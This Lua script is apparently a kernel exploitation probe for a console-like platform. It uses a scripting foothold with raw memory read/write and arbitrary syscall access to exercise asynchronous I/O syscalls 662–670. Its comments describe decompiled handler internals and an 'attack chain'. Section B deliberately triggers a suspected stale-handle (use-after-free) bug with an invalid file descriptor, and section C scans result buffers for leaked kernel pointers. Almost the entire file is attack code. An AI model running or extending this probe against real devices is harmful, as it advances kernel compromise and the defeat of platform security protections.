-- CRASH_CLASS: MODERATE (init/submit are safe; delete/cancel could crash if AIO state is inconsistent)
-- PROBE 86a: AIO REAL HANDLER EXPLOITATION — THE WALL IS FAKE
--
-- CRITICAL DISCOVERY: Decompiled handler analysis proves 661/665/668 are 5-instruction
-- DISABLED STUBS (kill/error). But 662-664, 666-667, 669-670 are REAL handlers with
-- 200-800 instruction implementations. The "AIO hard wall" was an n=1 generalization
-- from sys 661 — the other handlers were NEVER individually tested.
--
-- Attack chain:
-- A) sys 670 (AIO init) — initialize the AIO subsystem with configuration
-- B) sys 669 (AIO submit) — create AIO requests, get handles
--    BUG: "identifier copyout occurs BEFORE queue setup" → stale handle on error
-- C) sys 662 (AIO batch delete) + sys 663 (AIO multi-wait) + sys 664 (AIO cancel)
--
-- SELECT SECTION: Change TEST_SECTION to "A", "B", or "C"

local TEST_SECTION = "A"

print("=== PROBE 86a: AIO REAL HANDLERS — THE WALL IS FAKE ===")
print("Section: " .. TEST_SECTION)
print("")

-- Standard helpers
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt(val)
    if not val then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local pid = to_num(syscall.getpid())
print("PID: " .. pid)
print("")

--------------------------------------------------------------------
if TEST_SECTION == "A" then
--------------------------------------------------------------------
print("=== A: AIO INITIALIZATION + REACHABILITY SWEEP ===")
print("")
print("Testing sys 670 (AIO init) and basic reachability of 662-670.")
print("AVOIDING sys 661/665/668 (confirmed kill stubs)")
print("")

-- Step 1: Test sys 670 (AIO init) — the gateway to AIO
print("--- Step 1: sys 670 (AIO init) ---")
local sc670 = make_syscall(670)

-- From decompile: args are (config_ptr, config_len, reserved1, reserved2)
-- reserved1 and reserved2 MUST be zero, or returns EINVAL(22)
-- config_ptr can be NULL (uses defaults), config_len must be 0x3C if config provided

-- Test 1a: NULL config (default init)
print("[670] Test 1a: NULL config (default init)")
local ok, ret = pcall(function()
    return sc670(uint64(0), uint64(0), uint64(0), uint64(0))
end)
local rv = ok and to_num(ret) or -999
print("  ret=" .. rv .. " ok=" .. tostring(ok))
if rv == 0 then print("  *** AIO INIT SUCCEEDED WITH DEFAULTS ***") end
if rv == 16 then print("  Already initialized (expected on re-init)") end

local pid_c = to_num(syscall.getpid())
print("  PID check: " .. pid_c .. (pid == pid_c and " OK" or " CHANGED!"))
print("")

-- Test 1b: With configuration struct (3 groups × 20 bytes = 60 = 0x3C)
-- Each group: scan_limit(0..128), age_limit(0..128), split_mode(0|1),
--   chunk_size(1..0x1000000), other_chunk_size(1..0x1000000)
print("[670] Test 1b: With valid configuration struct")
local cfg = memory.alloc(0x40)  -- 0x3C needed + padding
-- Group 0: conservative settings
safe_wd(cfg + 0, 32)        -- scan_limit
safe_wd(cfg + 4, 32)        -- age_limit
safe_wd(cfg + 8, 0)         -- split_mode = 0 (no split)
safe_wd(cfg + 12, 0)        -- chunk_size (ignored in mode 0)
safe_wd(cfg + 16, 0)        -- other_chunk_size (ignored in mode 0)
-- Group 1: same
safe_wd(cfg + 20, 32)
safe_wd(cfg + 24, 32)
safe_wd(cfg + 28, 0)
safe_wd(cfg + 32, 0)
safe_wd(cfg + 36, 0)
-- Group 2: same
safe_wd(cfg + 40, 32)
safe_wd(cfg + 44, 32)
safe_wd(cfg + 48, 0)
safe_wd(cfg + 52, 0)
safe_wd(cfg + 56, 0)

local ok2, ret2 = pcall(function()
    return sc670(uint64(cfg), uint64(0x3C), uint64(0), uint64(0))
end)
local rv2 = ok2 and to_num(ret2) or -999
print("  ret=" .. rv2 .. " ok=" .. tostring(ok2))
if rv2 == 0 then print("  *** AIO INIT WITH CONFIG SUCCEEDED ***") end

pid_c = to_num(syscall.getpid())
print("  PID check: " .. pid_c .. (pid == pid_c and " OK" or " CHANGED!"))
print("")

-- Step 2: Reachability sweep of REAL handlers (skip 661/665/668)
print("--- Step 2: Reachability sweep (SAFE handlers only) ---")
local safe_aio = {662, 663, 664, 666, 667, 669, 670}

for _, num in ipairs(safe_aio) do
    -- Try with zeroed args first (expect errors, not kills)
    local ok_z, ret_z = pcall(function()
        return make_syscall(num)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    local rv_z = ok_z and to_num(ret_z) or -999
    local status = ""
    if rv_z == 0 then status = "SUCCESS"
    elseif rv_z == 22 then status = "EINVAL"
    elseif rv_z == 78 then status = "ENOSYS"
    elseif rv_z == -999 then status = "PCALL-FAIL"
    elseif rv_z == -1 then status = "ERROR"
    else status = "code=" .. rv_z end

    print(string.format("  sys %d: ret=%d [%s]", num, rv_z, status))

    pid_c = to_num(syscall.getpid())
    if pid ~= pid_c then
        print("  *** PID CHANGED after sys " .. num .. " ***")
        break
    end
end
print("")

-- Step 3: Test sys 659 (module handle enumeration)
print("--- Step 3: sys 659 (module handle list) ---")
local sc659 = make_syscall(659)
local handles_buf = memory.alloc(0x200)  -- room for 128 handles (4 bytes each)
local count_buf = memory.alloc(8)
safe_wq(count_buf, uint64(0))

local ok_659, ret_659 = pcall(function()
    return sc659(uint64(handles_buf), uint64(128), uint64(count_buf))
end)
local rv_659 = ok_659 and to_num(ret_659) or -999
print("  ret=" .. rv_659)

if rv_659 == 0 then
    local count_lo = safe_rd(count_buf)
    local count_hi = safe_rd(count_buf + 4)
    print("  handle count: " .. (count_lo or "nil"))
    if count_lo and count_lo > 0 then
        local max_show = count_lo
        if max_show > 20 then max_show = 20 end
        for i = 0, max_show - 1 do
            local h = safe_rd(handles_buf + i * 4)
            print(string.format("    handle[%d] = 0x%08X", i, h or 0))
        end
    end
end

pid_c = to_num(syscall.getpid())
print("  PID check: " .. pid_c .. (pid == pid_c and " OK" or " CHANGED!"))

--------------------------------------------------------------------
elseif TEST_SECTION == "B" then
--------------------------------------------------------------------
print("=== B: AIO SUBMIT + STALE HANDLE EXPLOITATION ===")
print("")
print("sys 669 AIO submit: creates async I/O requests.")
print("BUG: identifier copyout occurs BEFORE queue setup finishes.")
print("If queue setup fails after copyout, we get a handle to freed memory.")
print("")

-- First: init AIO
print("--- Step 1: Initialize AIO (sys 670) ---")
local sc670 = make_syscall(670)
local ok_init, ret_init = pcall(function()
    return sc670(uint64(0), uint64(0), uint64(0), uint64(0))
end)
print("AIO init: ret=" .. (ok_init and to_num(ret_init) or -999))
print("")

local pid_c = to_num(syscall.getpid())
if pid ~= pid_c then
    print("*** DEAD after init ***")
else
    -- Step 2: Try AIO submit with valid-looking request descriptors
    print("--- Step 2: AIO submit (sys 669) ---")
    local sc669 = make_syscall(669)

    -- Request descriptor layout (0x28 bytes each):
    -- +0x00: signed I/O offset (8 bytes)
    -- +0x08: byte count (8 bytes)
    -- +0x10: data pointer (8 bytes)
    -- +0x18: optional result pointer (8 bytes)
    -- +0x20: 32-bit file descriptor + padding

    -- Create a pipe to get valid FDs
    local pipe_fds = memory.alloc(8)
    local sc_pipe = make_syscall(42)
    local pipe_ok, pipe_ret = pcall(function()
        return sc_pipe(uint64(pipe_fds))
    end)
    local rd_fd = safe_rd(pipe_fds)
    local wr_fd = safe_rd(pipe_fds + 4)
    print("  pipe fds: read=" .. (rd_fd or "nil") .. " write=" .. (wr_fd or "nil"))

    -- Use the write end as AIO target
    local data_buf = memory.alloc(0x100)
    safe_wd(data_buf, 0x41414141)  -- test data

    -- Build ONE request descriptor
    local req = memory.alloc(0x30)  -- 0x28 + padding
    safe_wq(req + 0x00, uint64(0))           -- offset = 0
    safe_wq(req + 0x08, uint64(4))           -- count = 4 bytes
    safe_wq(req + 0x10, uint64(data_buf))    -- data pointer
    safe_wq(req + 0x18, uint64(0))           -- no result pointer
    safe_wd(req + 0x20, wr_fd or 0)          -- file descriptor

    -- Output for generated IDs
    local id_buf = memory.alloc(0x20)

    -- AIO submit args: (cmd_flags, user_reqs, count, queue_class, user_ids)
    -- cmd must have (cmd & 0xfff) == 1 (read) or 2 (write)
    -- queue_class must be 1-3

    -- Test 2a: write operation (cmd=2), class=1
    print("")
    print("[669] Test 2a: AIO write cmd=2, count=1, class=1")
    local ok_s, ret_s = pcall(function()
        return sc669(uint64(2), uint64(req), uint64(1), uint64(1), uint64(id_buf))
    end)
    local rv_s = ok_s and to_num(ret_s) or -999
    print("  ret=" .. rv_s)
    if rv_s == 0 then
        local id_lo = safe_rd(id_buf)
        local id_hi = safe_rd(id_buf + 4)
        print("  *** AIO SUBMIT SUCCEEDED ***")
        print("  Generated ID: 0x" .. string.format("%08X", id_lo or 0))
    end

    pid_c = to_num(syscall.getpid())
    print("  PID check: " .. pid_c .. (pid == pid_c and " OK" or " CHANGED!"))

    if pid == pid_c then
        -- Test 2b: read operation (cmd=1)
        print("")
        print("[669] Test 2b: AIO read cmd=1, count=1, class=1")
        local rd_req = memory.alloc(0x30)
        local rd_data = memory.alloc(0x100)
        safe_wq(rd_req + 0x00, uint64(0))
        safe_wq(rd_req + 0x08, uint64(4))
        safe_wq(rd_req + 0x10, uint64(rd_data))
        safe_wq(rd_req + 0x18, uint64(0))
        safe_wd(rd_req + 0x20, rd_fd or 0)

        local ok_r, ret_r = pcall(function()
            return sc669(uint64(1), uint64(rd_req), uint64(1), uint64(1), uint64(id_buf))
        end)
        local rv_r = ok_r and to_num(ret_r) or -999
        print("  ret=" .. rv_r)
        if rv_r == 0 then
            local id2 = safe_rd(id_buf)
            print("  *** AIO READ SUBMIT SUCCEEDED ***")
            print("  Generated ID: 0x" .. string.format("%08X", id2 or 0))
        end

        pid_c = to_num(syscall.getpid())
        print("  PID check: " .. pid_c .. (pid == pid_c and " OK" or " CHANGED!"))
    end

    if pid == pid_c then
        -- Test 2c: Trigger stale handle — submit with INVALID fd
        print("")
        print("[669] Test 2c: AIO submit with invalid FD (stale handle trigger)")
        local bad_req = memory.alloc(0x30)
        safe_wq(bad_req + 0x00, uint64(0))
        safe_wq(bad_req + 0x08, uint64(4))
        safe_wq(bad_req + 0x10, uint64(data_buf))
        safe_wq(bad_req + 0x18, uint64(0))
        safe_wd(bad_req + 0x20, 0xFFFF)  -- invalid fd

        local ok_bad, ret_bad = pcall(function()
            return sc669(uint64(2), uint64(bad_req), uint64(1), uint64(1), uint64(id_buf))
        end)
        local rv_bad = ok_bad and to_num(ret_bad) or -999
        print("  ret=" .. rv_bad)
        -- Even if submit "fails", check if ID was written (stale handle bug)
        local stale_id = safe_rd(id_buf)
        print("  ID buffer after failed submit: 0x" .. string.format("%08X", stale_id or 0))
        if rv_bad ~= 0 and stale_id and stale_id ~= 0 then
            print("  *** STALE HANDLE CONFIRMED — ID written before error ***")
        end

        pid_c = to_num(syscall.getpid())
        print("  PID check: " .. pid_c .. (pid == pid_c and " OK" or " CHANGED!"))
    end

    if pid == pid_c then
        -- Test 2d: Submit with flag 0x1000 (per-item mode)
        print("")
        print("[669] Test 2d: AIO submit with flag 0x1000 (per-item IDs)")
        local ok_f, ret_f = pcall(function()
            return sc669(uint64(0x1002), uint64(req), uint64(1), uint64(1), uint64(id_buf))
        end)
        local rv_f = ok_f and to_num(ret_f) or -999
        print("  ret=" .. rv_f)
        if rv_f == 0 then
            local fid = safe_rd(id_buf)
            print("  *** PER-ITEM MODE SUCCEEDED ***")
            print("  Per-item ID: 0x" .. string.format("%08X", fid or 0))
        end

        pid_c = to_num(syscall.getpid())
        print("  PID check: " .. pid_c .. (pid == pid_c and " OK" or " CHANGED!"))
    end
end

--------------------------------------------------------------------
elseif TEST_SECTION == "C" then
--------------------------------------------------------------------
print("=== C: AIO DELETE + WAIT + CANCEL (IF INIT SUCCEEDED) ===")
print("")
print("Tests sys 662 (batch delete), 663 (multi-wait), 664 (cancel)")
print("These need AIO to be initialized first (section A must succeed)")
print("")

-- Init AIO
print("--- Init AIO ---")
local sc670 = make_syscall(670)
pcall(function() sc670(uint64(0), uint64(0), uint64(0), uint64(0)) end)
print("AIO init called")

local pid_c = to_num(syscall.getpid())
if pid ~= pid_c then
    print("*** DEAD after init ***")
else
    -- Test sys 662 (batch delete) with dummy IDs
    print("")
    print("--- sys 662: AIO batch delete ---")
    local sc662 = make_syscall(662)
    local ids = memory.alloc(0x10)
    safe_wd(ids, 1)  -- dummy ID
    local results = memory.alloc(0x10)
    safe_wd(results, 0)

    -- args: (ids_pointer, signed_count, results_pointer)
    local ok_d, ret_d = pcall(function()
        return sc662(uint64(ids), uint64(1), uint64(results))
    end)
    local rv_d = ok_d and to_num(ret_d) or -999
    local result_val = safe_rd(results)
    print(string.format("  ret=%d, result[0]=0x%08X", rv_d, result_val or 0))

    pid_c = to_num(syscall.getpid())
    print("  PID check: " .. pid_c .. (pid == pid_c and " OK" or " CHANGED!"))

    if pid == pid_c then
        -- Test sys 663 (multi-wait/poll) — 801-instruction handler!
        print("")
        print("--- sys 663: AIO multi-wait/poll ---")
        local sc663 = make_syscall(663)

        -- Try with zero timeout (poll mode — returns immediately)
        local wait_ids = memory.alloc(0x10)
        safe_wd(wait_ids, 1)  -- dummy ID
        local wait_results = memory.alloc(0x40)

        local ok_w, ret_w = pcall(function()
            return sc663(uint64(wait_ids), uint64(1), uint64(wait_results))
        end)
        local rv_w = ok_w and to_num(ret_w) or -999
        print("  ret=" .. rv_w)

        -- Scan results for any kernel pointers
        print("  Results buffer:")
        for off = 0, 0x30, 8 do
            local val = safe_rq(wait_results + off)
            if val then
                local h, l = get_hi_lo(val)
                local kptr = (h >= 0xFFFF8000) and " *** KERNEL PTR ***" or ""
                print(string.format("    +0x%02X: %s%s", off, fmt(val), kptr))
            end
        end

        pid_c = to_num(syscall.getpid())
        print("  PID check: " .. pid_c .. (pid == pid_c and " OK" or " CHANGED!"))
    end

    if pid == pid_c then
        -- Test sys 664 (cancel)
        print("")
        print("--- sys 664: AIO cancel ---")
        local sc664 = make_syscall(664)

        local ok_c, ret_c = pcall(function()
            return sc664(uint64(1), uint64(0), uint64(0))  -- dummy ID, minimal args
        end)
        local rv_c = ok_c and to_num(ret_c) or -999
        print("  ret=" .. rv_c)

        pid_c = to_num(syscall.getpid())
        print("  PID check: " .. pid_c .. (pid == pid_c and " OK" or " CHANGED!"))
    end

    if pid == pid_c then
        -- Test sys 666 and 667 (unknown operations)
        print("")
        print("--- sys 666 + 667: unknown AIO ops ---")
        for _, num in ipairs({666, 667}) do
            local ok_x, ret_x = pcall(function()
                return make_syscall(num)(uint64(0), uint64(0), uint64(0))
            end)
            local rv_x = ok_x and to_num(ret_x) or -999
            print(string.format("  sys %d: ret=%d", num, rv_x))

            pid_c = to_num(syscall.getpid())
            if pid ~= pid_c then
                print("  *** PID CHANGED ***")
                break
            end
        end
    end
end

end -- TEST_SECTION

print("")
local final_pid = to_num(syscall.getpid())
print("Final PID: " .. final_pid .. (pid == final_pid and " OK" or " CHANGED!"))
print("=== PROBE 86a SECTION " .. TEST_SECTION .. " COMPLETE ===")
